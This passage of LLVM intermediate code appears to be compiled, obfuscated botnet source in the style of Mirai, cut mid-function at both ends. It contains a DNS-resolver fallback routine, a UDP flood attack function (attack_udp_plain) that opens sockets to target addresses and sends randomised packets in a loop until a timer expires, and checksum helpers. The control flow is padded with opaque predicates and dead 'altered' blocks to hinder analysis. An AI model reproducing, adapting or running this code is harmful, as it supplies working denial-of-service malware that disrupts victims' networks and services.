  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %164
  %173 = load i32, i32* %14, align 4
  %174 = add nsw i32 %173, 1
  store i32 %174, i32* %14, align 4
  %175 = load i32, i32* @x.35
  %176 = load i32, i32* @y.36
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart234, label %originalBB29alteredBB

originalBBpart234:                                ; preds = %originalBB29
  br label %46

; <label>:183:                                    ; preds = %originalBBpart227, %originalBBpart24
  %184 = load i8, i8* %17, align 1
  %185 = icmp ne i8 %184, 0
  br i1 %185, label %186, label %189

; <label>:186:                                    ; preds = %183
  %187 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %188 = call i32 @inet_addr(i8* %187) #6
  store i32 %188, i32* %9, align 4
  br label %234

; <label>:189:                                    ; preds = %183
  br label %190

; <label>:190:                                    ; preds = %189, %31
  br label %191

; <label>:191:                                    ; preds = %190, %originalBBpart2
  %192 = load i32, i32* @x.35
  %193 = load i32, i32* @y.36
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %191
  %200 = call i32 @rand_next()
  %201 = urem i32 %200, 4
  %202 = load i32, i32* @x.35
  %203 = load i32, i32* @y.36
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBBpart247, label %originalBB36alteredBB

originalBBpart247:                                ; preds = %originalBB36
  switch i32 %201, label %234 [
    i32 0, label %210
    i32 1, label %212
    i32 2, label %214
    i32 3, label %216
  ]

; <label>:210:                                    ; preds = %originalBBpart247
  %211 = call i32 @htonl(i32 134744072) #7
  store i32 %211, i32* %9, align 4
  br label %234

; <label>:212:                                    ; preds = %originalBBpart247
  %213 = call i32 @htonl(i32 1246898730) #7
  store i32 %213, i32* %9, align 4
  br label %234

; <label>:214:                                    ; preds = %originalBBpart247
  %215 = call i32 @htonl(i32 1074151430) #7
  store i32 %215, i32* %9, align 4
  br label %234

; <label>:216:                                    ; preds = %originalBBpart247
  %217 = load i32, i32* @x.35
  %218 = load i32, i32* @y.36
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %216
  %225 = call i32 @htonl(i32 67240450) #7
  store i32 %225, i32* %9, align 4
  %226 = load i32, i32* @x.35
  %227 = load i32, i32* @y.36
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %234

; <label>:234:                                    ; preds = %originalBBpart251, %214, %212, %210, %originalBBpart247, %186
  %235 = load i32, i32* %9, align 4
  ret i32 %235

originalBBalteredBB:                              ; preds = %originalBB, %0
  %236 = alloca i32, align 4
  %237 = alloca i32, align 4
  %238 = alloca i32, align 4
  %239 = alloca i32, align 4
  %240 = alloca [2048 x i8], align 16
  %241 = alloca i32, align 4
  %242 = alloca [32 x i8], align 16
  %243 = alloca i8, align 1
  %244 = alloca i8, align 1
  %245 = alloca i8, align 1
  store i32 0, i32* %237, align 4
  call void @table_unlock_val(i8 zeroext 37)
  %246 = call i8* @table_retrieve_val(i32 37, i32* null)
  %247 = call i32 (i8*, i32, ...) @open(i8* %246, i32 0)
  store i32 %247, i32* %237, align 4
  call void @table_lock_val(i8 zeroext 37)
  %248 = load i32, i32* %237, align 4
  %249 = icmp sge i32 %248, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %250 = load i32, i32* %14, align 4
  %251 = load i32, i32* %11, align 4
  %252 = icmp slt i32 %250, %251
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  %253 = load i8, i8* %18, align 1
  %254 = sext i8 %253 to i32
  %255 = icmp eq i32 %254, 32
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %104
  %256 = load i8, i8* %18, align 1
  %257 = sext i8 %256 to i32
  %258 = icmp slt i32 %257, 48
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %133
  %259 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %260 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %261 = load i32, i32* %12, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds i8, i8* %260, i64 %262
  %264 = load i32, i32* %14, align 4
  %265 = load i32, i32* %12, align 4
  %_ = shl i32 %264, %265
  %266 = sub nsw i32 %264, %265
  call void @util_memcpy(i8* %259, i8* %263, i32 %266)
  %267 = load i32, i32* %14, align 4
  %268 = load i32, i32* %12, align 4
  %_15 = sub i32 0, %267
  %gen = add i32 %_15, %268
  %_16 = sub i32 %267, %268
  %gen17 = mul i32 %_16, %268
  %_18 = shl i32 %267, %268
  %_19 = sub i32 0, %267
  %gen20 = add i32 %_19, %268
  %_21 = sub i32 %267, %268
  %gen22 = mul i32 %_21, %268
  %_23 = sub i32 0, %267
  %gen24 = add i32 %_23, %268
  %269 = sub nsw i32 %267, %268
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i64 0, i64 %270
  store i8 0, i8* %271, align 1
  store i8 1, i8* %17, align 1
  br label %originalBB14

originalBB29alteredBB:                            ; preds = %originalBB29, %164
  %272 = load i32, i32* %14, align 4
  %_30 = shl i32 %272, 1
  %_31 = shl i32 %272, 1
  %_32 = shl i32 %272, 1
  %273 = add nsw i32 %272, 1
  store i32 %273, i32* %14, align 4
  br label %originalBB29

originalBB36alteredBB:                            ; preds = %originalBB36, %191
  %274 = call i32 @rand_next()
  %_37 = sub i32 %274, 4
  %gen38 = mul i32 %_37, 4
  %_39 = shl i32 %274, 4
  %_40 = sub i32 %274, 4
  %gen41 = mul i32 %_40, 4
  %_42 = sub i32 %274, 4
  %gen43 = mul i32 %_42, 4
  %_44 = sub i32 0, %274
  %gen45 = add i32 %_44, 4
  %275 = urem i32 %274, 4
  br label %originalBB36

originalBB49alteredBB:                            ; preds = %originalBB49, %216
  %276 = call i32 @htonl(i32 67240450) #7
  store i32 %276, i32* %9, align 4
  br label %originalBB49
}

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i8*, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i64
  %28 = call noalias i8* @calloc(i64 %27, i64 8) #6
  %29 = bitcast i8* %28 to i8**
  store i8** %29, i8*** %12, align 8
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 4) #6
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 7, i32 65535)
  %37 = trunc i32 %36 to i16
  store i16 %37, i16* %14, align 2
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 6, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 0, i32 512)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %16, align 2
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 1, i32 1)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = bitcast %struct.sockaddr_in* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 16, i32 4, i1 false)
  %51 = call i64 @time(i64* null) #6
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = add nsw i64 %51, %53
  %55 = trunc i64 %54 to i32
  store i32 %55, i32* %19, align 4
  %56 = load i16, i16* %15, align 2
  %57 = zext i16 %56 to i32
  %58 = icmp eq i32 %57, 65535
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %5
  %60 = call i32 @rand_next()
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %15, align 2
  br label %65

; <label>:62:                                     ; preds = %5
  %63 = load i16, i16* %15, align 2
  %64 = call zeroext i16 @htons(i16 zeroext %63) #7
  store i16 %64, i16* %15, align 2
  br label %65

; <label>:65:                                     ; preds = %62, %59
  store i32 0, i32* %11, align 4
  br label %66

; <label>:66:                                     ; preds = %226, %65
  %67 = load i32, i32* %11, align 4
  %68 = load i8, i8* %7, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp slt i32 %67, %69
  br i1 %70, label %71, label %229

; <label>:71:                                     ; preds = %66
  %72 = load i32, i32* @x.37
  %73 = load i32, i32* @y.38
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %71
  %80 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %81 = load i8**, i8*** %12, align 8
  %82 = load i32, i32* %11, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8*, i8** %81, i64 %83
  store i8* %80, i8** %84, align 8
  %85 = load i16, i16* %14, align 2
  %86 = zext i16 %85 to i32
  %87 = icmp eq i32 %86, 65535
  %88 = load i32, i32* @x.37
  %89 = load i32, i32* @y.38
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %87, label %96, label %105

; <label>:96:                                     ; preds = %originalBBpart2
  %97 = call i32 @rand_next()
  %98 = trunc i32 %97 to i16
  %99 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %100 = load i32, i32* %11, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %99, i64 %101
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %102, i32 0, i32 0
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %103, i32 0, i32 1
  store i16 %98, i16* %104, align 2
  br label %114

; <label>:105:                                    ; preds = %originalBBpart2
  %106 = load i16, i16* %14, align 2
  %107 = call zeroext i16 @htons(i16 zeroext %106) #7
  %108 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %109 = load i32, i32* %11, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %108, i64 %110
  %112 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %111, i32 0, i32 0
  %113 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %112, i32 0, i32 1
  store i16 %107, i16* %113, align 2
  br label %114

; <label>:114:                                    ; preds = %105, %96
  %115 = load i32, i32* @x.37
  %116 = load i32, i32* @y.38
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %114
  %123 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %124 = load i32*, i32** %13, align 8
  %125 = load i32, i32* %11, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds i32, i32* %124, i64 %126
  store i32 %123, i32* %127, align 4
  %128 = icmp eq i32 %123, -1
  %129 = load i32, i32* @x.37
  %130 = load i32, i32* @y.38
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %128, label %137, label %138

; <label>:137:                                    ; preds = %originalBBpart24
  br label %288

; <label>:138:                                    ; preds = %originalBBpart24
  %139 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %139, align 4
  %140 = load i16, i16* %15, align 2
  %141 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %140, i16* %141, align 2
  %142 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %143 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %142, i32 0, i32 0
  store i32 0, i32* %143, align 4
  %144 = load i32*, i32** %13, align 8
  %145 = load i32, i32* %11, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i32, i32* %144, i64 %146
  %148 = load i32, i32* %147, align 4
  %149 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %150 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %150, %struct.sockaddr** %149, align 8
  %151 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %152 = load %struct.sockaddr*, %struct.sockaddr** %151, align 8
  %153 = call i32 @bind(i32 %148, %struct.sockaddr* %152, i32 16) #6
  %154 = icmp eq i32 %153, -1
  br i1 %154, label %155, label %172

; <label>:155:                                    ; preds = %138
  %156 = load i32, i32* @x.37
  %157 = load i32, i32* @y.38
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %155
  %164 = load i32, i32* @x.37
  %165 = load i32, i32* @y.38
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %172

; <label>:172:                                    ; preds = %originalBBpart28, %138
  %173 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %174 = load i32, i32* %11, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 2
  %178 = load i8, i8* %177, align 4
  %179 = zext i8 %178 to i32
  %180 = icmp slt i32 %179, 32
  br i1 %180, label %181, label %207

; <label>:181:                                    ; preds = %172
  %182 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %183 = load i32, i32* %11, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i64 %184
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i32 0, i32 1
  %187 = load i32, i32* %186, align 4
  %188 = call i32 @ntohl(i32 %187) #7
  %189 = call i32 @rand_next()
  %190 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %191 = load i32, i32* %11, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 2
  %195 = load i8, i8* %194, align 4
  %196 = zext i8 %195 to i32
  %197 = lshr i32 %189, %196
  %198 = add i32 %188, %197
  %199 = call i32 @htonl(i32 %198) #7
  %200 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %201 = load i32, i32* %11, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i64 %202
  %204 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %203, i32 0, i32 0
  %205 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %204, i32 0, i32 2
  %206 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %205, i32 0, i32 0
  store i32 %199, i32* %206, align 4
  br label %207

; <label>:207:                                    ; preds = %181, %172
  %208 = load i32*, i32** %13, align 8
  %209 = load i32, i32* %11, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds i32, i32* %208, i64 %210
  %212 = load i32, i32* %211, align 4
  %213 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %214 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %215 = load i32, i32* %11, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %217, i32 0, i32 0
  %219 = bitcast %struct.sockaddr_in* %218 to %struct.sockaddr*
  store %struct.sockaddr* %219, %struct.sockaddr** %213, align 8
  %220 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %221 = load %struct.sockaddr*, %struct.sockaddr** %220, align 8
  %222 = call i32 @connect(i32 %212, %struct.sockaddr* %221, i32 16)
  %223 = icmp eq i32 %222, -1
  br i1 %223, label %224, label %225

; <label>:224:                                    ; preds = %207
  br label %225

; <label>:225:                                    ; preds = %224, %207
  br label %226

; <label>:226:                                    ; preds = %225
  %227 = load i32, i32* %11, align 4
  %228 = add nsw i32 %227, 1
  store i32 %228, i32* %11, align 4
  br label %66

; <label>:229:                                    ; preds = %66
  br label %230

; <label>:230:                                    ; preds = %287, %229
  %231 = load i32, i32* @x.37
  %232 = load i32, i32* @y.38
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %230
  store i32 0, i32* %11, align 4
  %239 = load i32, i32* @x.37
  %240 = load i32, i32* @y.38
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %247

; <label>:247:                                    ; preds = %278, %originalBBpart212
  %248 = load i32, i32* %11, align 4
  %249 = load i8, i8* %7, align 1
  %250 = zext i8 %249 to i32
  %251 = icmp slt i32 %248, %250
  br i1 %251, label %252, label %281

; <label>:252:                                    ; preds = %247
  %253 = load i8**, i8*** %12, align 8
  %254 = load i32, i32* %11, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds i8*, i8** %253, i64 %255
  %257 = load i8*, i8** %256, align 8
  store i8* %257, i8** %25, align 8
  %258 = load i8, i8* %17, align 1
  %259 = icmp ne i8 %258, 0
  br i1 %259, label %260, label %268

; <label>:260:                                    ; preds = %252
  %261 = load i8*, i8** %25, align 8
  %262 = load i16, i16* %16, align 2
  %263 = zext i16 %262 to i32
  call void @rand_alphastr(i8* %261, i32 %263)
  %264 = load i8*, i8** %25, align 8
  %265 = load i16, i16* %16, align 2
  %266 = zext i16 %265 to i64
  %267 = getelementptr inbounds i8, i8* %264, i64 %266
  store i8 0, i8* %267, align 1
  br label %268

; <label>:268:                                    ; preds = %260, %252
  %269 = load i32*, i32** %13, align 8
  %270 = load i32, i32* %11, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds i32, i32* %269, i64 %271
  %273 = load i32, i32* %272, align 4
  %274 = load i8*, i8** %25, align 8
  %275 = load i16, i16* %16, align 2
  %276 = zext i16 %275 to i64
  %277 = call i64 @send(i32 %273, i8* %274, i64 %276, i32 16384)
  br label %278

; <label>:278:                                    ; preds = %268
  %279 = load i32, i32* %11, align 4
  %280 = add nsw i32 %279, 1
  store i32 %280, i32* %11, align 4
  br label %247

; <label>:281:                                    ; preds = %247
  %282 = call i64 @time(i64* null) #6
  %283 = load i32, i32* %19, align 4
  %284 = sext i32 %283 to i64
  %285 = icmp sgt i64 %282, %284
  br i1 %285, label %286, label %287

; <label>:286:                                    ; preds = %281
  br label %288

; <label>:287:                                    ; preds = %281
  br label %230

; <label>:288:                                    ; preds = %286, %137
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %71
  %289 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %290 = load i8**, i8*** %12, align 8
  %291 = load i32, i32* %11, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds i8*, i8** %290, i64 %292
  store i8* %289, i8** %293, align 8
  %294 = load i16, i16* %14, align 2
  %295 = zext i16 %294 to i32
  %296 = icmp eq i32 %295, 65535
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %114
  %297 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %298 = load i32*, i32** %13, align 8
  %299 = load i32, i32* %11, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds i32, i32* %298, i64 %300
  store i32 %297, i32* %301, align 4
  %302 = icmp eq i32 %297, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %155
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %230
  store i32 0, i32* %11, align 4
  br label %originalBB10
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %originalBBpart2, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %35

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  br label %16

; <label>:16:                                     ; preds = %9
  %17 = load i32, i32* @x.39
  %18 = load i32, i32* @y.40
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i32, i32* %4, align 4
  %26 = sub i32 %25, 2
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* @x.39
  %28 = load i32, i32* @y.40
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %6

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, 1
  br i1 %37, label %38, label %45

; <label>:38:                                     ; preds = %35
  %39 = load i16*, i16** %3, align 8
  %40 = load i16, i16* %39, align 2
  %41 = trunc i16 %40 to i8
  %42 = sext i8 %41 to i64
  %43 = load i64, i64* %5, align 8
  %44 = add i64 %43, %42
  store i64 %44, i64* %5, align 8
  br label %45

; <label>:45:                                     ; preds = %38, %35
  %46 = load i64, i64* %5, align 8
  %47 = lshr i64 %46, 16
  %48 = load i64, i64* %5, align 8
  %49 = and i64 %48, 65535
  %50 = add i64 %47, %49
  store i64 %50, i64* %5, align 8
  %51 = load i64, i64* %5, align 8
  %52 = lshr i64 %51, 16
  %53 = load i64, i64* %5, align 8
  %54 = add i64 %53, %52
  store i64 %54, i64* %5, align 8
  %55 = load i64, i64* %5, align 8
  %56 = xor i64 %55, -1
  %57 = trunc i64 %56 to i16
  ret i16 %57

originalBBalteredBB:                              ; preds = %originalBB, %16
  %58 = load i32, i32* %4, align 4
  %_ = sub i32 0, %58
  %gen = add i32 %_, 2
  %59 = sub i32 %58, 2
  store i32 %59, i32* %4, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = load i32, i32* @x.41
  %6 = load i32, i32* @y.42
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca %struct.iphdr*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i16, align 2
  %16 = alloca i32, align 4
  %17 = alloca i16*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %13, align 8
  store i8* %1, i8** %14, align 8
  store i16 %2, i16* %15, align 2
  store i32 %3, i32* %16, align 4
  %22 = load i8*, i8** %14, align 8
  %23 = bitcast i8* %22 to i16*
  store i16* %23, i16** %17, align 8
  %24 = load %struct.iphdr*, %struct.iphdr** %13, align 8
  %25 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %24, i32 0, i32 8
  %26 = load i32, i32* %25, align 4
  store i32 %26, i32* %18, align 4
  %27 = load %struct.iphdr*, %struct.iphdr** %13, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 9
  %29 = load i32, i32* %28, align 4
  store i32 %29, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %30 = load i32, i32* %16, align 4
  store i32 %30, i32* %21, align 4
  %31 = load i32, i32* @x.41
  %32 = load i32, i32* @y.42
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %39

; <label>:39:                                     ; preds = %originalBBpart216, %originalBBpart2
  %40 = load i32, i32* @x.41
  %41 = load i32, i32* @y.42
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %39
  %48 = load i32, i32* %16, align 4
  %49 = icmp sgt i32 %48, 1
